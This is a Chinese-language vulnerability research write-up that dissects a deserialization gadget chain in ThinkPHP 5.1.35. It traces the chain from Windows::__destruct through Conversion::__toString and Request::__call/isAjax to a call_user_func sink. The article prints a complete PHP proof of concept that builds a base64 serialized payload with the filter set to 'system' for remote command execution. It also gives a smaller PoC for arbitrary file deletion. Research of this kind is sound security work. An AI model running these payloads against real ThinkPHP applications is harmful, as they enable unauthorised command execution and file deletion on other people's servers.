> 原文链接: https://www.anquanke.com//post/id/187274 


# Thinkphp 反序列化利用链深入分析


                                阅读量   
                                **547843**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                    



[![](https://p4.ssl.qhimg.com/t012985cca4ca6c3227.jpg)](https://p4.ssl.qhimg.com/t012985cca4ca6c3227.jpg)



作者：Ethan@知道创宇404实验室

## 前言

今年7月份，ThinkPHP 5.1.x爆出来了一个反序列化漏洞。之前没有分析过关于ThinkPHP的反序列化漏洞。今天就探讨一下ThinkPHP的反序列化问题!



## 环境搭建
- Thinkphp 5.1.35
- php 7.0.12


## 漏洞挖掘思路

在刚接触反序列化漏洞的时候，更多遇到的是在魔术方法中，因此自动调用魔术方法而触发漏洞。但如果漏洞触发代码不在魔法函数中，而在一个类的普通方法中。并且魔法函数通过属性（对象）调用了一些函数，恰巧在其他的类中有同名的函数（pop链）。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。



## 漏洞分析

首先漏洞的起点为/thinkphp/library/think/process/pipes/Windows.php的__destruct()

[![](https://p1.ssl.qhimg.com/dm/1024_666_/t01fd59a5b1c405e483.png)](https://p1.ssl.qhimg.com/dm/1024_666_/t01fd59a5b1c405e483.png)

__destruct()里面调用了两个函数，我们跟进removeFiles()函数。

```
class Windows extends Pipes
`{`
    private $files = [];
    ....
    private function removeFiles()
    `{`
        foreach ($this-&gt;files as $filename) `{`
            if (file_exists($filename)) `{`
                @unlink($filename);
            `}`
        `}`
        $this-&gt;files = [];
    `}`
    ....
`}`
```

这里使用了$this-&gt;files，而且这里的$files是可控的。所以存在一个任意文件删除的漏洞。

POC可以这样构造：

```
namespace think\process\pipes;

class Pipes`{`

`}`

class Windows extends Pipes
`{`
private $files = [];

public function __construct()
`{`
$this-&gt;files=['需要删除文件的路径'];
`}`
`}`

echo base64_encode(serialize(new Windows()));
```

这里只需要一个反序列化漏洞的触发点，便可以实现任意文件删除。

在removeFiles()中使用了file_exists对$filename进行了处理。我们进入file_exists函数可以知道，$filename会被作为字符串处理。

[![](https://p2.ssl.qhimg.com/dm/1024_310_/t017aa79bc760f66484.png)](https://p2.ssl.qhimg.com/dm/1024_310_/t017aa79bc760f66484.png)

而__toString 当一个对象被反序列化后又被当做字符串使用时会被触发，我们通过传入一个对象来触发__toString 方法。我们全局搜索__toString方法。

[![](https://p2.ssl.qhimg.com/t01c9771808d857b099.png)](https://p2.ssl.qhimg.com/t01c9771808d857b099.png)

我们跟进\thinkphp\library\think\model\concern\Conversion.php的Conversion类的第224行,这里调用了一个toJson()方法。

```
.....
    public function __toString()
    `{`
        return $this-&gt;toJson();
    `}`
    .....
```

跟进toJson()方法

```
....
    public function toJson($options = JSON_UNESCAPED_UNICODE)
    `{`
        return json_encode($this-&gt;toArray(), $options);
    `}`
    ....
```

继续跟进toArray()方法

```
public function toArray()
    `{`
        $item    = [];
        $visible = [];
        $hidden  = [];
        .....
        // 追加属性（必须定义获取器）
        if (!empty($this-&gt;append)) `{`
            foreach ($this-&gt;append as $key =&gt; $name) `{`
                if (is_array($name)) `{`
                    // 追加关联对象属性
                    $relation = $this-&gt;getRelation($key);

                    if (!$relation) `{`
                        $relation = $this-&gt;getAttr($key);
                        $relation-&gt;visible($name);
                    `}`
            .....
```

我们需要在toArray()函数中寻找一个满足$可控变量-&gt;方法(参数可控)的点，首先，这里调用了一个getRelation方法。我们跟进getRelation()，它位于Attribute类中

```
....
    public function getRelation($name = null)
    `{`
        if (is_null($name)) `{`
            return $this-&gt;relation;
        `}` elseif (array_key_exists($name, $this-&gt;relation)) `{`
            return $this-&gt;relation[$name];
        `}`
        return;
    `}`
    ....
```

由于getRelation()下面的if语句为if (!$relation)，所以这里不用理会，返回空即可。然后调用了getAttr方法，我们跟进getAttr方法

```
public function getAttr($name, &amp;$item = null)
    `{`
        try `{`
            $notFound = false;
            $value    = $this-&gt;getData($name);
        `}` catch (InvalidArgumentException $e) `{`
            $notFound = true;
            $value    = null;
        `}`
        ......
```

继续跟进getData方法

```
public function getData($name = null)
    `{`
        if (is_null($name)) `{`
            return $this-&gt;data;
        `}` elseif (array_key_exists($name, $this-&gt;data)) `{`
            return $this-&gt;data[$name];
        `}` elseif (array_key_exists($name, $this-&gt;relation)) `{`
            return $this-&gt;relation[$name];
        `}`
```

通过查看getData函数我们可以知道$relation的值为$this-&gt;data[$name]，需要注意的一点是这里类的定义使用的是Trait而不是class。自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use 关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。然后我们需要找到一个子类同时继承了Attribute类和Conversion类。

我们可以在\thinkphp\library\think\Model.php中找到这样一个类

```
abstract class Model implements \JsonSerializable, \ArrayAccess
`{`
    use model\concern\Attribute;
    use model\concern\RelationShip;
    use model\concern\ModelEvent;
    use model\concern\TimeStamp;
    use model\concern\Conversion;
    .......
```

我们梳理一下目前我们需要控制的变量
1. $files位于类Windows
1. $append位于类Conversion
1. $data位于类Attribute
利用链如下：

[![](https://p4.ssl.qhimg.com/t010190f2e4ea3133e7.png)](https://p4.ssl.qhimg.com/t010190f2e4ea3133e7.png)



## 代码执行点分析

我们现在缺少一个进行代码执行的点，在这个类中需要没有visible方法。并且最好存在__call方法，因为__call一般会存在__call_user_func和__call_user_func_array，php代码执行的终点经常选择这里。我们不止一次在Thinkphp的rce中见到这两个方法。可以在/thinkphp/library/think/Request.php，找到一个__call函数。__call调用不可访问或不存在的方法时被调用。

```
......
   public function __call($method, $args)
    `{`
        if (array_key_exists($method, $this-&gt;hook)) `{`
            array_unshift($args, $this);
            return call_user_func_array($this-&gt;hook[$method], $args);
        `}`

        throw new Exception('method not exists:' . static::class . '-&gt;' . $method);
    `}`
   .....
```

但是这里我们只能控制$args，所以这里很难反序列化成功，但是 $hook这里是可控的，所以我们可以构造一个hook数组”visable”=&gt;”method”，但是array_unshift()向数组插入新元素时会将新数组的值将被插入到数组的开头。这种情况下我们是构造不出可用的payload的。

在Thinkphp的Request类中还有一个功能filter功能，事实上Thinkphp多个RCE都与这个功能有关。我们可以尝试覆盖filter的方法去执行代码。

代码位于第1456行。

```
....
  private function filterValue(&amp;$value, $key, $filters)
    `{`
        $default = array_pop($filters);

        foreach ($filters as $filter) `{`
            if (is_callable($filter)) `{`
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            `}`
            .....
```

但这里的$value不可控，所以我们需要找到可以控制$value的点。

```
....
    public function input($data = [], $name = '', $default = null, $filter = '')
    `{`
        if (false === $name) `{`
            // 获取原始数据
            return $data;
        `}`
        ....
       // 解析过滤器
        $filter = $this-&gt;getFilter($filter, $default);

        if (is_array($data)) `{`
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) `{`
                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针

                $this-&gt;arrayReset($data);
            `}`
        `}` else `{`
            $this-&gt;filterValue($data, $name, $filter);
        `}`
.....
```

但是input函数的参数不可控，所以我们还得继续寻找可控点。我们继续找一个调用input函数的地方。我们找到了param函数。

```
public function param($name = '', $default = null, $filter = '')
    `{`
         ......

        if (true === $name) `{`
            // 获取包含文件上传信息的数组
            $file = $this-&gt;file();
            $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;

            return $this-&gt;input($data, '', $default, $filter);
        `}`

        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
    `}`
```

这里仍然是不可控的，所以我们继续找调用param函数的地方。找到了isAjax函数

```
public function isAjax($ajax = false)
    `{`
        $value  = $this-&gt;server('HTTP_X_REQUESTED_WITH');
        $result = 'xmlhttprequest' == strtolower($value) ? true : false;

        if (true === $ajax) `{`
            return $result;
        `}`

        $result           = $this-&gt;param($this-&gt;config['var_ajax']) ? true : $result;
        $this-&gt;mergeParam = false;
        return $result;
    `}`
```

在isAjax函数中，我们可以控制$this-&gt;config[‘var_ajax’]，$this-&gt;config[‘var_ajax’]可控就意味着param函数中的$name可控。param函数中的$name可控就意味着input函数中的$name可控。

param函数可以获得$_GET数组并赋值给$this-&gt;param。

再回到input函数中

```
$data = $this-&gt;getData($data, $name);
```

$name的值来自于$this-&gt;config[‘var_ajax’]，我们跟进getData函数。

```
protected function getData(array $data, $name)
    `{`
        foreach (explode('.', $name) as $val) `{`
            if (isset($data[$val])) `{`
                $data = $data[$val];
            `}` else `{`
                return;
            `}`
        `}`

        return $data;
    `}`
```

这里$data直接等于$data[$val]了

然后跟进getFilter函数

```
protected function getFilter($filter, $default)
    `{`
        if (is_null($filter)) `{`
            $filter = [];
        `}` else `{`
            $filter = $filter ?: $this-&gt;filter;
            if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) `{`
                $filter = explode(',', $filter);
            `}` else `{`
                $filter = (array) $filter;
            `}`
        `}`

        $filter[] = $default;

        return $filter;
    `}`
```

这里的$filter来自于this-&gt;filter，我们需要定义this-&gt;filter为函数名。

我们再来看一下input函数，有这么几行代码

```
....
if (is_array($data)) `{`
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            ...
```

这是一个回调函数，跟进filterValue函数。

```
private function filterValue(&amp;$value, $key, $filters)
    `{`
        $default = array_pop($filters);

        foreach ($filters as $filter) `{`
            if (is_callable($filter)) `{`
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            `}` elseif (is_scalar($value)) `{`
                if (false !== strpos($filter, '/')) `{`
                    // 正则过滤
                    if (!preg_match($filter, $value)) `{`
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    `}`
         .......
```

通过分析我们可以发现filterValue.value的值为第一个通过GET请求的值，而filters.key为GET请求的键，并且filters.filters就等于input.filters的值。

我们尝试构造payload,这里需要namespace定义命名空间

```
&lt;?php
namespace think;
abstract class Model`{`
    protected $append = [];
    private $data = [];
    function __construct()`{`
        $this-&gt;append = ["ethan"=&gt;["calc.exe","calc"]];
        $this-&gt;data = ["ethan"=&gt;new Request()];
    `}`
`}`
class Request
`{`
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       =&gt; '_method',
        // 表单ajax伪装变量
        'var_ajax'         =&gt; '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         =&gt; '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     =&gt; 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   =&gt; ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   =&gt; '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  =&gt; '',
        // HTTPS代理标识
        'https_agent_name' =&gt; '',
        // IP代理获取标识
        'http_agent_ip'    =&gt; 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  =&gt; 'html',
    ];
    function __construct()`{`
        $this-&gt;filter = "system";
        $this-&gt;config = ["var_ajax"=&gt;''];
        $this-&gt;hook = ["visible"=&gt;[$this,"isAjax"]];
    `}`
`}`
namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
`{`
    private $files = [];

    public function __construct()
    `{`
        $this-&gt;files=[new Pivot()];
    `}`
`}`
namespace think\model;

use think\Model;

class Pivot extends Model
`{`
`}`
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?&gt;
```

首先自己构造一个利用点，别问我为什么，这个漏洞就是需要后期开发的时候有利用点，才能触发

[![](https://p3.ssl.qhimg.com/dm/1024_439_/t01ff7baf447c31e922.png)](https://p3.ssl.qhimg.com/dm/1024_439_/t01ff7baf447c31e922.png)

我们把payload通过POST传过去，然后通过GET请求获取需要执行的命令

[![](https://p1.ssl.qhimg.com/dm/1024_481_/t01c519e7eaf329fc07.png)](https://p1.ssl.qhimg.com/dm/1024_481_/t01c519e7eaf329fc07.png)

执行点如下：

[![](https://p1.ssl.qhimg.com/dm/1024_355_/t01af4d3f0dd2a6274c.png)](https://p1.ssl.qhimg.com/dm/1024_355_/t01af4d3f0dd2a6274c.png)

利用链如下：

[![](https://p0.ssl.qhimg.com/dm/1024_319_/t0131cf2361ce858071.png)](https://p0.ssl.qhimg.com/dm/1024_319_/t0131cf2361ce858071.png)



## 参考文章

[https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/](https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/)

[https://xz.aliyun.com/t/3674](https://xz.aliyun.com/t/3674)

[https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html](https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html)

[http://www.f4ckweb.top/index.php/archives/73/](http://www.f4ckweb.top/index.php/archives/73/)

[https://cl0und.github.io/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/](https://cl0und.github.io/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)

本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1040/](https://paper.seebug.org/1040/)
